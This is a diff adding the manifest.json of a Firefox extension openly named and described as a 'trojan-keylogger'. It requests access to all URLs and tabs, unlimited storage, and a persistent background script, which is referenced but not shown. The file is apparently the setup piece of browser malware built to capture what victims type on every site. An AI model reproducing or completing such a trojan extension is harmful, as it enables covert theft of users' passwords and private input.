@@ -1,0 +1,21 @@
+{
+    "name": "firefox-trojan-keylogger",
+    "version": "1.0.0",
+    "description": "trojan-keylogger",
+    "icons": {
+      "16": "/app/img/ico.png",
+      "48": "/app/img/ico.png",
+      "128": "/app/img/ico.png"
+    },
+    "background": {
+      "scripts": ["app/js/background.js"],
+      "persistent": true
+    },
+    "permissions": [
+        "tabs",
+         "<all_urls>",
+        "unlimitedStorage",
+        "storage"
+    ],
+    "manifest_version": 2
+}
